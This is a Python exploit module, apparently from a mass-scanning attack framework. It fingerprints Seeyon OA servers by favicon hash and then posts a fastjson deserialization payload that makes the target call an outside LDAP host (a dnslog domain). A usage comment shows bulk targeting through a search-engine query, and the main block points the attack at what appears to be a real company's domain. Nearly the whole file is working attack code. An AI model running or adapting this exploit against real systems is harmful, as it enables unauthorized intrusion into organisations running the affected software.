# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 12:32

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# python batch.py -m exploit.web.OA.Seeyon.deserialize_A8_fastjson -cs -fs "app=\"致远互联-OA\""
class Script(BaseScript):
    name = 'Seeyon'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.DESERIALIZE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/seeyon/main.do?method=changeLocale']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = '''
        致远 OA V7.1、V7.1SP1
        致远 OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3
        致远 OA V6.1、V6.1SP1、V6.1SP2
        致远 V6.0及V6.0SP1
        致远 V5.6及V5.6SP1
        '''
        self.favicon = ['cdc85452665e7708caed3009ecb7d4e2',
                        '17ac348fcce0b320e7bfab3fe2858dfa',
                        '57f307ad3764553df84e7b14b7a85432',
                        '3c8df395ec2cbd72782286d18a286a9a',
                        '2f761c27b6b7f9386bbd61403635dc42',
                        '055c3de1ef212cc16bec218c3ae08ca7']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('Seeyon Finger', url))
                                    return {'name': 'Seeyon Finger', 'url': url, 'software': 'Seeyon'}
        except aiohttp.ClientOSError:
            # 实战中遇到的异步库的BUG，可能是需要请求HTTPS
            try:
                async with aiohttp.ClientSession() as session:
                    for detectPath in self.detectPathList:
                        url = f'https://{self.target}{detectPath}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                        async with session.get(url=url, timeout=self.reqTimeout, verify_ssl=False) as response:
                            if response is not None:
                                text = await response.read()
                                await asyncio.sleep(2)
                                m1 = hashlib.md5()
                                m1.update(text)
                                theMD5 = m1.hexdigest()
                                for _ in self.favicon:
                                    if _ == theMD5:
                                        self.flag = True
                                        self.httpsFlag = True
                                        tqdm.write(Fore.RED + '[{}] {}'.format('Seeyon Finger', url))
                                        return {'name': 'Seeyon Finger', 'url': url, 'software': 'Seeyon'}
            except Exception:
                return None
        except Exception:
            return None

    async def exec(self):
        try:
            headers = self.headers.copy()
            headers.update({"Content-Type": "application/x-www-form-urlencoded"})
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    if self.httpsFlag:
                        url = f'https://{self.target}{execPath}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    data = '_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://chachahapi.dnslog.cn","autoCommit":true}}'
                    async with session.post(url=url, data=data, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            text = await response.text()
                            if 'not support' not in text:
                                tqdm.write(Fore.RED + '[{}] {}'.format('Seeyon Deserialize FastJson', url))
                                return {'name': 'Seeyon Deserialize FastJson', 'url': url, 'software': 'Seeyon'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://oa.geelytalent.com.cn/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    semaphore = asyncio.Semaphore(500)
    sc = Script('oa.geelytalent.com.cn', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
